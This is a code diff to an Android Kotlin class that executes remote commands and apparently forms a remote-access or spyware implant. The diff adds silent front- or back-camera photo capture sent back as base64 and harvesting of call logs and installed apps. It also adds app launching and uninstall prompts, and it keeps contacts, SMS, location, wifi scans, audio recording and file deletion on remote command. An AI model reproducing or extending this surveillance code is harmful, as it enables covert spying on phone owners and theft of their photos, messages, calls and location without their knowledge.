@@ -315,18 +315,112 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                     } catch (e: Exception) {}
                 }
-            }
-
-            // Asynchronous commands
-            when (command) {
-                "location" -> {
-                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
-                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                        if (loc != null) {
-                            val obj = JSONObject().apply { put("lat", loc.latitude); put("lon", loc.longitude); put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}") }
-                            sendResponse(createResponse(cmdId, "location_data", obj))
-                        } else sendResponse(createResponse(cmdId, "error", "Location not found"))
+                "photo" -> {
+                    try {
+                        val result = capturePhotoBlocking(textArg.lowercase() == "front")
+                        val resp = createResponse(cmdId, "photo_result", result)
+                        sendResponse(resp)
+                        return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Photo failed: ${e.message}")
+                        sendResponse(resp)
+                        return resp
+                    }
+                }
+                "call_logs" -> {
+                    if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
+                        val res = JSONArray()
+                        val cursor = context.contentResolver.query(
+                            CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC"
+                        )
+                        cursor?.use {
+                            val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                            val numIdx  = it.getColumnIndex(CallLog.Calls.NUMBER)
+                            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+                            val durIdx  = it.getColumnIndex(CallLog.Calls.DURATION)
+                            val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
+                            while (it.moveToNext() && res.length() < 50) {
+                                val callType = when (it.getInt(typeIdx)) {
+                                    CallLog.Calls.INCOMING_TYPE -> "incoming"
+                                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                                    CallLog.Calls.MISSED_TYPE   -> "missed"
+                                    else -> "unknown"
+                                }
+                                res.put(JSONObject().apply {
+                                    put("name", it.getString(nameIdx) ?: "Unknown")
+                                    put("number", it.getString(numIdx) ?: "")
+                                    put("type", callType)
+                                    put("duration", formatDuration(it.getLong(durIdx)))
+                                    put("date", it.getLong(dateIdx))
+                                })
+                            }
+                        }
+                        val resp = createResponse(cmdId, "call_logs", res)
+                        sendResponse(resp); return resp
+                    } else {
+                        val resp = createResponse(cmdId, "error", "Izin READ_CALL_LOG tidak diberikan")
+                        sendResponse(resp); return resp
+                    }
+                }
+                "app_list" -> {
+                    val pm = context.packageManager
+                    val showAll = textArg.lowercase() == "all"
+                    val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+                    val res = JSONArray()
+                    apps.filter { showAll || (it.flags and ApplicationInfo.FLAG_SYSTEM == 0) }
+                        .sortedBy { pm.getApplicationLabel(it).toString() }
+                        .forEach {
+                            res.put(JSONObject().apply {
+                                put("name", pm.getApplicationLabel(it).toString())
+                                put("package", it.packageName)
+                            })
+                        }
+                    val resp = createResponse(cmdId, "app_list", res)
+                    sendResponse(resp); return resp
+                }
+                "launch_app" -> {
+                    try {
+                        val intent = context.packageManager.getLaunchIntentForPackage(textArg)
+                        if (intent != null) {
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            context.startActivity(intent)
+                            val resp = createResponse(cmdId, "success", "Membuka $textArg")
+                            sendResponse(resp); return resp
+                        } else {
+                            val resp = createResponse(cmdId, "error", "App tidak ditemukan: $textArg")
+                            sendResponse(resp); return resp
+                        }
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Launch failed: ${e.message}")
+                        sendResponse(resp); return resp
+                    }
+                }
+                "uninstall_app" -> {
+                    try {
+                        val intent = Intent(Intent.ACTION_DELETE).apply {
+                            data = Uri.parse("package:$textArg")
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        context.startActivity(intent)
+                        val resp = createResponse(cmdId, "success", "Dialog uninstall dibuka untuk $textArg")
+                        sendResponse(resp); return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Uninstall failed: ${e.message}")
+                        sendResponse(resp); return resp
+                    }
+                }
+                "play_sound" -> {
+                    try {
+                        val mp = android.media.MediaPlayer()
+                        mp.setDataSource(textArg)
+                        mp.prepare()
+                        mp.start()
+                        mp.setOnCompletionListener { it.release() }
+                        val resp = createResponse(cmdId, "success", "Memutar: $textArg")
+                        sendResponse(resp); return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Putar gagal: ${e.message}")
+                        sendResponse(resp); return resp
                     }
                 }
                 "contacts" -> {
@@ -341,7 +435,8 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                                 })
                             }
                         }
-                        sendResponse(createResponse(cmdId, "contacts_list", res))
+                        val resp = createResponse(cmdId, "contacts_list", res)
+                        sendResponse(resp); return resp
                     }
                 }
                 "sms_list" -> {
@@ -352,26 +447,50 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             while (it.moveToNext() && res.length() < 50) {
                                 res.put(JSONObject().apply {
                                     put("from", it.getString(it.getColumnIndex("address")))
-                                    put("body", it.getString(it.getColumnIndex("body")))
+                                    put("body", it.getString(it.getColumnIndex("body")).take(200))
                                 })
                             }
                         }
-                        sendResponse(createResponse(cmdId, "sms_inbox", res))
-                    }
-                }
-                "sms_send" -> {
-                    val parts = textArg.split("|")
-                    if (parts.size >= 2) {
-                        SmsManager.getDefault().sendTextMessage(parts[0], null, parts[1], null, null)
-                        sendResponse(createResponse(cmdId, "success", "Sent"))
+                        val resp = createResponse(cmdId, "sms_inbox", res)
+                        sendResponse(resp); return resp
                     }
                 }
                 "wifi_scan" -> {
                     val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                     val res = JSONArray()
-                    wm.scanResults.forEach { res.put(JSONObject().apply { put("ssid", it.SSID); put("level", it.level) }) }
-                    sendResponse(createResponse(cmdId, "wifi_networks", res))
+                    wm.scanResults.forEach { ap ->
+                        res.put(JSONObject().apply {
+                            put("ssid", ap.SSID.ifEmpty { "(Hidden)" })
+                            put("level", ap.level)
+                            put("signal", "${ap.level} dBm")
+                        })
+                    }
+                    val resp = createResponse(cmdId, "wifi_networks", res)
+                    sendResponse(resp); return resp
                 }
+                "location" -> {
+                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
+                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                        if (loc != null) {
+                            val obj = JSONObject().apply {
+                                put("lat", loc.latitude); put("lon", loc.longitude)
+                                put("accuracy", loc.accuracy)
+                                put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
+                            }
+                            val resp = createResponse(cmdId, "location_data", obj)
+                            sendResponse(resp); return resp
+                        } else {
+                            val resp = createResponse(cmdId, "error", "Location tidak tersedia")
+                            sendResponse(resp); return resp
+                        }
+                    }
+                }
+            }
+
+            // Async-only: long running tasks yang tidak perlu return langsung ke HTTP
+            when (command) {
                 "record_sound" -> {
                     Thread {
                         try {
@@ -388,10 +507,6 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             sendResponse(createResponse(cmdId, "audio_base64", b64))
                         } catch (e: Exception) { sendResponse(createResponse(cmdId, "error", e.message ?: "Record failed")) }
                     }.start()
-                }
-                "photo" -> {
-                    // Photo implementation usually needs more setup, leaving as simplified async
-                    sendResponse(createResponse(cmdId, "error", "Photo via Web not yet optimized"))
                 }
                 "rm" -> {
                     val f = java.io.File(textArg)
@@ -463,5 +578,83 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
             if (cmdId.isNotEmpty()) put("id", cmdId)
             put("type", type); put("data", data); put("timestamp", System.currentTimeMillis())
         }.toString()
+    }
+
+    private fun capturePhotoBlocking(useFront: Boolean): JSONObject {
+        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val cameraId = camManager.cameraIdList.firstOrNull { id ->
+            val facing = camManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
+            if (useFront) facing == CameraCharacteristics.LENS_FACING_FRONT
+            else facing == CameraCharacteristics.LENS_FACING_BACK
+        } ?: camManager.cameraIdList.first()
+
+        val imageCapture = java.util.concurrent.CompletableFuture<ByteArray>()
+        val handlerThread = HandlerThread("cam_sync_${System.currentTimeMillis()}").apply { start() }
+        val camHandler = Handler(handlerThread.looper)
+        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
+        var cameraDevice: CameraDevice? = null
+
+        imageReader.setOnImageAvailableListener({ reader ->
+            try {
+                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+                val buffer = image.planes[0].buffer
+                val bytes = ByteArray(buffer.remaining()).also { buffer.get(it) }
+                image.close()
+                if (!imageCapture.isDone) imageCapture.complete(bytes)
+            } catch (e: Exception) {
+                if (!imageCapture.isDone) imageCapture.completeExceptionally(e)
+            }
+        }, camHandler)
+
+        camManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+            override fun onOpened(camera: CameraDevice) {
+                cameraDevice = camera
+                camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        try {
+                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                addTarget(imageReader.surface)
+                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                            }.build()
+                            // Beri waktu sedikit untuk AE sebelum capture
+                            camHandler.postDelayed({ session.capture(req, null, camHandler) }, 600)
+                        } catch (e: Exception) {
+                            if (!imageCapture.isDone) imageCapture.completeExceptionally(e)
+                        }
+                    }
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        if (!imageCapture.isDone) imageCapture.completeExceptionally(Exception("Session config failed"))
+                    }
+                }, camHandler)
+            }
+            override fun onDisconnected(camera: CameraDevice) {
+                camera.close()
+                if (!imageCapture.isDone) imageCapture.completeExceptionally(Exception("Camera disconnected"))
+            }
+            override fun onError(camera: CameraDevice, error: Int) {
+                camera.close()
+                if (!imageCapture.isDone) imageCapture.completeExceptionally(Exception("Camera error: $error"))
+            }
+        }, camHandler)
+
+        return try {
+            val bytes = imageCapture.get(10, java.util.concurrent.TimeUnit.SECONDS)
+            val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
+            JSONObject().apply {
+                put("facing", if (useFront) "front" else "back")
+                put("jpeg_base64", b64)
+            }
+        } finally {
+            try { cameraDevice?.close() } catch (_: Exception) {}
+            try { imageReader.close() } catch (_: Exception) {}
+            handlerThread.quitSafely()
+        }
+    }
+
+    private fun formatDuration(seconds: Long): String {
+        val m = seconds / 60
+        val s = seconds % 60
+        return if (m > 0) "${m}m ${s}s" else "${s}s"
     }
 }
